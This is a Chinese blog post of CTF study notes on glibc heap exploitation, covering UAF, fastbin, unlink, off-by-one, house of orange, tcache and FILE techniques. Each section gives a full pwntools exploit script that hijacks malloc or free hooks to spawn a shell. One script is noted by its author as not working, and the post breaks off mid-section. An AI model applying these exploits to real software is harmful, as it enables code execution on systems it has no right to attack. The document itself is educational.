---
title: HWS计划2020day4
date:   2020-11-11 22:31:31
updated:  2020-11-11 22:31:31
tags:
    - pwn
    - heap
    - glibc
categories: 
	- HWS计划2020
use:
  - Valine
text: true
lazyload: true
count: true
---

# use after free

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605079567432-57449587-39ef-4f21-8547-3796f707f12d.png)

## 例题-hacknote

### 逆向分析



在add的逻辑中分析出结构体，转到结构体界面添加（快捷键insert、d）：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605080420752-4a647e0e-1c9d-413d-baf9-97f85929ea1d.png)

之后将结构体类型用上![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604661593649-331c5702-8af7-4158-9639-d034708dd7a5.png)后：
![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605080474053-6e2a39ac-d6ad-4d07-a05c-268ede753ac3.png)



del逻辑：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605080535044-56b37962-9d6f-4a73-937f-b7c00917ace2.png)发现存在UAF

print逻辑：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605080574671-6f566f33-4f67-4002-bab9-d561d7487260.png)

存在![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604661895673-b9f204fd-9b16-4a3c-b60b-285b06fec9f5.png)判断，无法负数索引

存在后门函数![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604661995750-67c74f91-4161-4d09-9dc0-3d38d3513ff4.png)

### 调试



先申请l两个再释放两个：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605082283958-8a6b6ec4-6e7a-49f3-ba0c-20212e4d4f17.png)

可以发现两个结构体指针串在了一起，那么申请size控制一样即可改变结构体指针了

将其改为system地址，参数布置为'sh'之后调用print即可获取shell

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605082483526-c7987609-a16e-4408-bed0-e03f102944ab.png)

### 脚本

```python
from pwn import *
context.log_level='debug'
p = process('./hacknote')

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def addnote(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)


def delnote(idx):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))


def printnote(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

system=0x08048506
launch_gdb()
addnote(0x30,'aaa')#0
addnote(0x30,'bbb')#1

delnote(0)
delnote(1)

addnote(0x8,p32(system)+';sh;')
printnote(0)

p.interactive()
```



# fastbin attack

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605082600750-d6bb0383-3232-4ed7-8c9c-de1320da5014.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605082660146-04d9af94-9895-4cd8-9ac6-06478a11e69a.png)

## 例题-fastbin

### 逆向分析

程序在刚开始往bss段读入了一个值

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605082818802-078d9cf5-3f02-4cf6-8922-98a2bf15527b.png)

add函数：

发现canary被错误识别成了一个数组

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605082895943-5a0d1230-e30e-4f85-bc8f-f06e9ac0b90d.png)

canary定义出来（快捷键d）后f5：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605083016778-e89b9d8d-7a3c-470c-b126-0d80973d4f51.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605083077167-08195670-9c2e-4008-8c49-1a61101269ba.png)   

del函数：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605083121637-1c9d0b35-0d88-48fa-b64b-04fb2a85ad6e.png)存在UAF

show函数：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605083137629-1abfb8ea-85fb-4387-afa5-fe018ab396b8.png)

### 调试

首先double free 

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605083980463-07e47e81-eaa0-4341-9a79-af327f94520e.png)

malloc到可以控制data的地方，就可以泄露地址（预先通过name伪造好chunk，不然通不过检查）：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605085036973-f4e43eb2-e8c6-4627-a516-7129820fb843.png)

得到libc基址后可以计算出__malloc_hook地址，一般该地址-0x23处可以当作伪造chunk（0x7f忽略低位大小就是0x70）：
![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605085130081-6a98e53a-66f0-444e-a70c-774ca79b93a8.png)

然后再来一轮将malloc_hook地址内容填上one_gadget之后malloc以下就可以获取shell了

(由于此时已到答申请堆块次数限制，无法进行malloc，**尝试触发double free，报错时会再进行一次malloc**，或者在最开始布置好第二次利用的参数)

### 脚本

```python
from pwn import *
context.log_level='debug'
p=process('./fastbin')

def launch_gdb():
    context.terminal=['gnome-terminal','-x','sh','-c']
    gdb.attach(proc.pidof(p)[0])

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)
    

def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    

def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

launch_gdb()
p.recvuntil('name')
p.sendline(p64(0)+p64(0x60))
p.recvuntil('hello')
new(0x50,'aaa')#0
new(0x50,'bbb')#1

delete(0)
delete(1)
delete(0)

new(0x50,p64(0x602100))#2=0
new(0x50,'ccc')#3=1
new(0x50,'ddd')#4=0
new(0x50,'e'*0x10+p64(0x602018))#free_plt#5
show(0)

leak=u64(p.recv(6)+'\x00\x00')-0x84540#数值为动态调试出来
success('leak libc:'+hex(leak))
malloc_hook=leak+0x3c4b10#p&__malloc_hook  -0x23 0x7f---0x70

new(0x60,'111')#6
new(0x60,'222')#7
delete(6)
delete(7)
delete(6)
new(0x60,p64(malloc_hook-0x23))
new(0x60,'333')#8
new(0x60,'444')#9
new(0x60,'\x00'*3+p64(0)*2+p64(leak+0xf0364))#0x4527a 0xf0364 0xf1207 #10
delete(6)
delete(6)
# p.sendline('1')
# p.recvuntil('size')
# p.sendline('66')
p.interactive()
from pwn import *

p = process('./fastbin')
context.log_level = 'debug'

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)
    

def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    

def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

launch_gdb()
p.recvuntil('name')
p.send(p64(0x0) + p64(0x71) + p64(0x602100))
p.recvuntil('hello')
new(0x60,'aaa')#0
new(0x60,'bbb')#1
delete(0)
delete(1)
delete(0)
new(0x60,p64(0x602100))#3=0
new(0x60,'aaa')#4=1
new(0x60,p64(0xdeadbeef))#5=0
new(0x60,p64(0x602100) + p64(0)+ p64(0x602018))#6=    0x602100   维持fd
show(0)
leak = u64(p.recv(6).ljust(8,'\x00'))
log.info(hex(leak))
libc_base = leak - 542016
malloc_hook = 3951376 + libc_base
new(0x60,p64(malloc_hook - 0x23) + p64(0))
new(0x60,p64(malloc_hook - 0x23) + p64(0))#断链
new(0x60,'\x00' * 3 + p64(0)*2 + p64(libc_base + 0xf1207))#修改
p.sendline('1')
p.recvuntil('size')
p.sendline('66')
p.interactive()
```

# unlink

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605093614802-fa9d1ab3-ab44-4c0d-b8e2-4c661f7bc473.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605093632214-aade0833-88d3-4c15-9152-15d24a4e3e73.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605093684308-f899f5ad-aa6e-4eb8-8bfd-361fa6f85711.png)

## 例题offbyone_unlink

### 逆向分析

add的大小：
![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605093941696-82450425-6456-490a-b176-db7201d6f4b8.png)

可以申请到一个unsorted bin

del中置0了，并些num-1

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605094002519-86b09dfb-ffef-4b0f-aa44-ef373ffe8ce6.png)

漏洞点，edit中存在off by one：
![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605094041341-656a5dd9-d08a-4239-a03f-730225f815ca.png)

### 调试

首先申请一个占用下一个chunk prev size位大小的chunk，编辑fd，bk指针，之后溢出到下一个chunk的prev in use位后free下个chunk触发unlink达成目的

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605095015938-0e50619f-3d4c-446b-890e-7d0714c2996e.png)

可以看到data的指针指向了data-0x18的位置，获得了任意地址读写的功能

此时修改chunk0就可以改写data数组（堆数组）的目的，比如将chunk1改成想要的got地址，leak libc

leak 之后再改写free hook为system即可，最后free掉有字符读'/bin/sh'的chunk即可获取shell

### 脚本

```python
from pwn import *

p = process('./offbyone_unlink')
context.log_level = 'debug'

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)

def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    

def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

def edit(i,s):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('index?')
    p.sendline(str(i))
    p.recvuntil('data')
    p.send(s)
# launch_gdb()
data_addr=0x602120
new(0x108,'aaa')#size=0x110
new(0xf0,'bbb')#size=0x100
new(0x100,'/bin/sh\x00')

payload=p64(0)+p64(0x101)+p64(data_addr-0x18)+p64(data_addr-0x10)
payload=payload.ljust(0x100,'a')+p64(0x100)+p8(0)#伪造prev size
edit(0,payload)
delete(1)


edit(0,p64(0)*3+p64(data_addr-0x18)+p64(0x602018))
show(1)
leak=u64(p.recv(6)+'\x00\x00')-0x84540
success('libc addr:'+hex(leak))
free_hook=leak+0x3c67a8

edit(0,p64(0)*3+p64(data_addr-0x18)+p64(free_hook))

edit(1,p64(0x453a0+leak))
delete(2)
p.interactive()
```

# 

# off-by-one

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605095661988-99d44bc8-0254-42b2-90e6-b4f168e86c51.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605095766199-8e6ccb0f-17b3-4c69-9cef-7114ef7f6566.png)

## 例题offbyone

### 逆向分析

逻辑与上题相同

### 调试

首先依旧申请以8结尾的chunk，占用下一个chunk的prev_size位从而off_by_one修改下一个chunk的大小，然后free掉放入unsorted bin中（一个大的，重叠了两块chunk）

然后再申请小的chunk,申请两块之后后一块就和最开始申请的重合了（2，4chunk一样）

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605096398318-215fb3c9-5786-4297-a6f7-4f555c2d8495.png)

此外，申请出来的第一块可以leak地址（unsorted bin）双链表，链入了main_arena：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605096267308-304fb709-603f-41a1-8533-ef053d7c73d0.png)

之后double free改malloc_hook为one_gadget即可

若是one_gadget不行（栈环境有问题）

#### 调整栈空间变量的方法

1.通过使用libc 报错（double free）malloc时的环境

2.realloc_hook=__malloc_hook-0x8的位置上，可以作为一个跳板，将malloc_hook地址改为realloc_hook地址，再将realloc_hook的内容填成one_gadget

### 脚本

```python
from pwn import *

p = process('./offbyone')
context.log_level = 'debug'

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)
    

def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    

def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

def edit(i,s):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('index?')
    p.sendline(str(i))
    p.recvuntil('data')
    p.send(s)
# launch_gdb()


new(0x28,'zzz')             #0
new(0xf0,'aaa')             #1 0x100--->0x170
new(0x60,'/bin/sh\x00')     #2 0x70
new(0x60,'/bin/sh\x00')     #3
edit(0,p64(0)*5+p8(0x71))
delete(1)

new(0xf0,'a')             #1
show(1)
leak = p.recv(6).ljust(8,'\x00')
leak = u64(leak)
log.info('leak ' + hex(leak))
libc_base = leak - 3951713
malloc_hook = 3951376 + libc_base
one_addr = 0xf0364 + libc_base
realloc_addr = 542480 + libc_base

new(0x60,'/bin/sh\x00') # 4与2重合
delete(4)
delete(3)
delete(2)

new(0x60,p64(malloc_hook - 0x23))#xiu gai cheng maoxx
new(0x60,p64(malloc_hook - 0x23))
new(0x60,p64(malloc_hook - 0x23))
#zhan qian yi de fang fa
# # #realloc_hook=__malloc_hook-0x8
# # #malloc_hook->realloc_hook
# # #realloc_hhok->one_gadget
# # new(0x60,p8(0) * 0xb + p64(sys_addr) + p64(realloc_addr))
# # new(0x60,p8(0) * 0xb + p64(sys_addr) + p64(realloc_addr))
new(0x60,p8(0) * 0x13 + p64(one_addr))

delete(2)
delete(4)

p.interactive()
```

# unsorted bin attack

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605097126192-8907af70-2093-4a25-9fb6-fb50b0bb0fcd.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605097159765-56f56863-db21-440e-8eba-1ed8559553d5.png)

## 例题unsorted_bin

### 逆向分析

add函数：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605097331848-6369d85b-b2b8-4a90-8f75-6db72734e8fe.png)

固定为0x100大小

del函数存在UAF

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605097355200-43b96ee7-ba4c-44ed-8bb0-a34e49e4a652.png)

### 调试

首先当然是uaf修改fd bk指针了，之后重新申请回去后：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605098002866-3017137c-49bd-47e0-a876-2761fac7f87a.png)变成了一个很奇怪的地址，过去看看，是main_arena的地址（top chunk）

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605098039411-ee29eb39-4475-425d-830d-c9cedc266a76.png)

而如果申请一个chunk bin中没有就会去top chunk中切割，而切割过程检查也不多，只要保证top chunk size足够大就好

找到一个伪造top chunk的地方：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605098357359-b79eaa10-073a-4ef6-92d4-906194584f23.png)

之后修改即可分配到想要的chunk

但由于静态编译没有system函数，考虑栈迁移rop：
找到该函数（setcontext）：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605098708729-d0d74e8b-cb2c-437e-9434-e37fbab7cb68.png)

可以布置参数

### 脚本

(不是很懂+没跑通)

```python
from pwn import *

p = process('./unsorted_bin')
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])

def add(i,c):
    p.sendlineafter('>','1')
    p.recvuntil('id')
    p.sendline(str(i))
    p.sendafter('input',c)

def edit(i,c):
    p.sendlineafter('>','3')
    p.recvuntil('id')
    p.sendline(str(i))
    p.sendafter('input',c)

def dele(i):
    p.sendlineafter('>','2')
    p.recvuntil('id')
    p.sendline(str(i))
launch_gdb()
data_addr = 0x6CCBB0
bins_addr = 0x00000000006cb858
add(0,'aaa')
add(1,'bbb')
dele(0)
edit(0,p64(data_addr-0x10)*2)
regs = '\x00' * 0x68 + p64(data_addr - 0xf0) 
regs = regs.ljust(0xa0,'\x00') + p64(data_addr - 0xf0 + 16) + p64(0x0000000000480b86)
add(1,regs)

edit(0,p64(0x6ccab0)+ p64(0) + p64(bins_addr)*2)
#0x6ccab0 某个hook之前满足top chunk切割size的地址
payload = '/bin/sh\x00' + p64(59) + p64(59) + p64(0)*2 + p64(0x40F4FA)
add(2,payload.ljust(0xf0,'\x00') + p64(0x6CD608))
edit(0,p64(0x40F519))
dele(1)
#0x6CD608 free_hook
#0x0000000000480b86 : pop rax ; pop rdx ; pop rbx ; ret
p.interactive()
```

# house of orange

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605099652818-99f22511-8707-4be9-a47f-13c1488a8b78.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605099680357-0ae46384-09a2-4a67-93a7-7dc4a393cf81.png)

1.top chunk地址+top chunk size 最后三位0x000

## 例题bookwriter

### 逆向分析

首先向bss段读入数据：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605099961367-a171121a-9229-4e78-a46d-3d31d7898792.png)

add限制为9个

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605100016780-3c0ce407-0238-47df-b3c5-8f62cdc6d2cd.png)

但发现data只有8个：![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605100183804-6bafc1e9-9b76-41c1-9ad3-772d4f92829e.png)那么可以溢出到data_size（漏洞1）

并且再edit中通过![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605100242744-2f80c12c-502f-4ed0-a759-b57a44c322b7.png)strlen函数获取长度（漏洞2）

information函数会打印author信息并还可以修改它

程序无free功能

### 调试

首先申请一个chunk并填满，这时就和top chunk相邻了，此时修改就会改变大小，下一次修改即可修改到top chunk的size了

将top chunk的size高位去掉一般就可以通过检查（0x20fe1--->0x0fe1）

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605100609786-ab8ff2ac-8b1d-44d8-8fb2-7cfa67de3d15.png)修改成功

此时申请一个大一点的chunk，top chunk就会到unsorted bin中

此时继续申请就会从unsorted bin中切割给我们了

在申请一个就可以leak了

然后填满chunk，溢出到data[9]时data[0]的size变成一个很大的数

之后通过填充author可以leak 堆的地址 

### 脚本

```python
from pwn import *
context.log_level = 'debug'
# p = process('./bookwriter',env={'LD_PRELOAD':'./libc_64.so.6'})
p = process('./bookwriter')
# p = remote('chall.pwnable.tw', 10304)

buffer_addr = 0x602060


def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])


def add(page_size, context):
    p.sendline('1')
    p.recvuntil('Size of page :')
    p.sendline(str(page_size))
    p.recvuntil('Content :')
    p.send(context)
    p.recvuntil('Done !')


def view(id):
    p.sendline('2')
    p.recvuntil('Index of page :')
    p.sendline(str(id))
    p.recvuntil('Content :\n')


def edit(id, context):
    p.sendline('3')
    p.recvuntil('Index of page :')
    p.sendline(str(id))
    p.recvuntil('Content:')
    p.send(context)
    p.recvuntil('Done !')


def information(author):
    p.sendline('4')
    p.recvuntil('Do you want to change the author ? (yes:1 / no:0) ')
    p.sendline('1')
    p.recvuntil('Author :')
    p.send(author)


# launch_gdb()
p.recvuntil('Author :')
p.send('a'*64)
p.recvuntil('Your choice :')


# house of orange

add(0x18, 'b'*0x18)  # 0
edit(0, 'b'*0x18)
edit(0, '\x00'*0x18+'\xe1\x0f\x00')

add(0x1ffe1, 'c'*20)  # 1


add(0x40,'d'*8)  # 2

for i in range(6):
    add(0x40,'e'*8)
view(3)
p.recvuntil('e' * 8)
leak_libc_addr = u64(p.recv(6).ljust(8, '\x00'))
log.info('leak libc addr = ' + hex(leak_libc_addr))
sys_addr = 0x7febe6678390-0x7febe69f6b78+leak_libc_addr
log.info('sys addr = '+hex(sys_addr))
malloc_hook_addr = 0x7f5826fc7b10-0x7f5826fc7b78+leak_libc_addr
log.info('malloc hook addr = '+hex(malloc_hook_addr))

p.sendline('4')
p.recvuntil('Author : ')
p.recvuntil('a'*64)
leak_heap = u64(p.recv(4).ljust(8,'\x00'))
log.info('leak heap address = ' + hex(leak_heap))
p.recvuntil('Do you want to change the author ? (yes:1 / no:0) ')
p.sendline('1')
p.recvuntil('Author :')
p.send('/bin/sh\x00'+p64(0x111)+p64(leak_libc_addr)+p64(leak_libc_addr)+p64(0)*4)
#伪造一个 unsorted bin leak_libc_addr---链表头地址
p.recvuntil('Your choice :')

edit(0,p64(0))
add(0x50,'a'*10)

edit(0,p64(0)*84+p64(0xdead)+p64(0x41)+p64(buffer_addr)+p64(buffer_addr))#+p64(0xdeadbeefdeadbeef)*7)

add(0x100, 'a'*48+p64(malloc_hook_addr-8))

edit(0,p64(0)+p64(sys_addr))

p.sendline('1')
p.recvuntil('Size of page :')
p.sendline(str(buffer_addr))

p.interactive()
```

# tcache

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605101468235-f9b2e2cc-8782-45e6-bf75-220a66f00a26.png)

数量有限：7个

## 例题tcache

### 逆向分析

add函数：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605101547081-aaecb4ae-614b-4d54-a134-4e18c3db957e.png)

edit函数存在溢出：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605101606694-7017885b-9486-4ba0-964b-c6af65085c6c.png)可以构造堆块重合

### 调试

首先我们需要一个unsorted bin，需要足够大，所以申请够多的chunk

之后free掉就得到了一个unsorted chunk，就可以leak libc了，还可以继续申请构造double free

### 脚本

```python
from pwn import *


local = 1
p = process('./tcache')
context.log_level = 'debug'

def launch_gdb():
    if local != 1:
        return
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])

def add(s):
    p.recvuntil('----------menu----------')
    p.sendline('1')
    p.recvuntil('content:')
    p.send(s)

def edit(i,s):
    p.recvuntil('----------menu----------')
    p.sendline('2')
    p.recvuntil('string:')
    p.sendline(str(i))
    p.recvuntil('content:')
    p.send(s)

def dele(i):
    p.recvuntil('----------menu----------')
    p.sendline('3')
    p.recvuntil('string:')
    p.sendline(str(i))

def show(i):
    p.recvuntil('----------menu----------')
    p.sendline('4')
    p.recvuntil('string:')
    p.sendline(str(i))
for _ in xrange(19):
    add('aaa')
    #让free后再unsorted bin中

# launch_gdb()
edit(0,'a'*48 + p64(0x65) + p64(0x40*17 + 1))
#不能与top chunk相邻
dele(1)
edit(0,'a'*64)#leak
show(0)
p.recvuntil('a'*64)
leak = u64(p.recv(6)+'\x00\x00')
log.info('leak libc ' + hex(leak))

libc_base = leak - 4111520
free_hook = 4118760 + libc_base
sys_addr = 324832+0x70 + libc_base
edit(0,'a'*48 + p64(0x65) + p64(0x40*17 + 1))#恢复
add('aaa')
add('aaa')

dele(6)#随便腾个空间
dele(2)
edit(19,p64(free_hook))
add(p64(sys_addr))
add(p64(sys_addr))

edit(9,'/bin/sh\x00')
dele(9)

p.interactive()
```

# FILE结构体

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102311828-2261ae71-4131-4d47-93aa-7343236438d0.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102321675-fd9a2532-ef49-415e-b65e-e4a0e1dafc2d.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102328896-ee765b9c-c36c-4295-9c1d-e44788a65765.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102338910-0af73d99-0df2-4fe2-9895-a39f9a2ab8a0.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102362547-3b7a90e5-1ab7-4c19-a9f4-9ba472ca728e.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102383591-8fecd9a6-d1d1-42b0-afa7-a1f1d092d3b1.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102402565-fa23dea8-3733-407e-91b3-c44079daf589.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102427129-0676af8c-b61e-4be9-a7f7-b985fc583193.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102453301-a37d28f2-4659-4b37-895a-6b96c7998d26.png)

## 例题io_leak

### 逆向分析

只有add和del功能，无法通过show来leak

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605102647149-f7edce97-a44b-4ff2-a652-fe7896506a2a.png)存在off by one

### 调试

off by one构造unsorted bin，之后构造double free

stdout与main_arena及其接近

所以double后爆破到stdout上修改flag值leak地址

### 脚本

```python
from pwn import *
p = process('./io_leak')
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])

def alloca(i,c,data):
    p.recvuntil('>>>')
    p.sendline('1')
    p.recvuntil('idx:')
    p.sendline(str(i))
    p.recvuntil('len:')
    p.sendline(str(c))
    p.recvuntil('content:')
    p.send(data)

def free(i):
    p.recvuntil('>>>')
    p.sendline('2')
    p.recvuntil('idx:')
    p.sendline(str(i))

# 
# launch_gdb()
def leak_addr():
    alloca(0,1,'aa')
    alloca(1,0x4f0,'aaaaaa')#size=0x500
    alloca(2,0xb0,'aa')#size=0xc0
    alloca(3,0xb0,'aa')
    free(0)
    alloca(0,0x18,'/bin/sh\x00'*3 + '\xc1')
    free(1)
    alloca(1,0x4f0,'aaaaaa')
    free(2)
    alloca(4,0x30,'\x50\x47')
    alloca(2,0xb0,'aaa')
    alloca(5,0xb0,p64(0)*2 + p64(0xfbad3c80)+p64(0)*3+p8(0))
    #最后的值可以微调
leak = 0
while True:
    try:
        leak_addr()
        ss = p.recvuntil(chr(0x7f),timeout = 0.5)
        if len(ss) == 0:
            raise Exception('')
        p.recv(16)
        leak = u64(p.recv(8))
        if leak == 0x320a6464412e310a:
            raise Exception('')
        break
    except Exception:
        p.close()
        p = process('./io_leak')
        continue

launch_gdb()
leak = leak >> 16
log.info('leak libc : '+ hex(leak))
libc_base = leak - 4110208
log.info('libc base: '+ hex(libc_base))
free_hook = 4118760 + libc_base
sys_addr = 324832+libc_base

free(2)
free(4)
alloca(2,0xb0,p64(free_hook))
alloca(4,0x30,p64(free_hook))
alloca(6,0x30,p64(sys_addr))
alloca(7,0x30,p64(sys_addr))
free(0)

p.interactive()
```

# glibc2.29 tcache

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103621001-46af7055-ad49-43cd-8780-db396ca8639b.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103633560-6e512f57-ec5f-4e39-b0d5-7ae3ea534190.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103646037-b611da04-060b-4472-ada2-5a65dc91bd88.png)

## 例题tcache231

### 逆向分析

打开时发现plt分析错误

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103767800-a6775ec2-fbd7-49ef-9396-f77f69a164c5.png)

并且前端存在![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103808772-dcc3a5d6-e888-4cd2-9908-3a47ce90bad9.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103858293-0f71717b-2882-4814-8911-09ee5c7f2402.png)

endbr64保证程序流不被打断，若是call指令前没这个就会报错，限制了gadgets

新增了一个段.plt.sec

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103904828-9918793d-d440-4f3a-b239-a50def282637.png)

可以下个插件https://github.com/veritas501/PltResolver分析

add函数：只能申请到tcache，并且存在off-by-null

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605103981611-e74608c6-a21e-4f56-9d66-4f45691db482.png)

del函数存在uaf

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104052956-0075a6df-3855-4ca0-b579-1f44c935e228.png)

### 调试

通过off-by-null修改chunk大小，double free就可以绕过检查了

之后任意地址申请先把count修改了，并且leak----改hook即可

### 脚本

```python
from pwn import *

p = process('./tcache231')
context.log_level = 'debug'
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 
    # os.system("gnome-terminal -- gdb -q ./tcache231 " + str(proc.pidof(p)[0]))

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)
    
def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    
def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

# launch_gdb()
new(0x28,'zzz') # 0
new(0x100,'aaa') # 1
new(0x100,'aaa') # 1
delete(2)
delete(1)
delete(0)
new(0x28,'a'*0x28)
delete(1)
new(0xf0,p64(0x4040AC))#0x4040AC num
new(0x100,'aaa')
# new(0x100,p32(0) + p64(0) * 2 + p64(0xffffff) * 4 + p64(0x404018)+p64(0)*5)
new(0x100,p32(0) + p64(0) * 6 + p64(0x404018)+p64(0)*5)#  覆盖chunk数量为0 0x404018 got地址来leak
show(0)
leak = u64(p.recv(6) + b'\x00'*2) - 645200
log.info('leak ' + hex(leak))
new(0x28,'zzz') # 0
new(0x100,'aaa') # 1
new(0x100,'aaa') # 1
delete(3)
delete(2)
delete(1)
new(0x28,'/bin/sh\x00' + 'a'*0x20)
delete(2)
new(0xf0,p64(leak + libc.symbols['__free_hook']))
new(0x100,p64(leak + libc.symbols['__free_hook']))
new(0x100,p64(leak + libc.symbols['system']))
delete(1)
p.interactive()
```

# glibc2.27以上small bin attack

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104537022-d50a3f4d-8ed5-490e-b220-0de1fe202270.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104554308-d174c9a5-b355-402f-b66e-b1711f5ae4d7.png)

## 例题playTheNew

### 逆向分析

首先申请一个内存区域：

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1605104679371-f2140d49-278f-4db5-8317-db7630fed4b9.png)

在init_array发现：

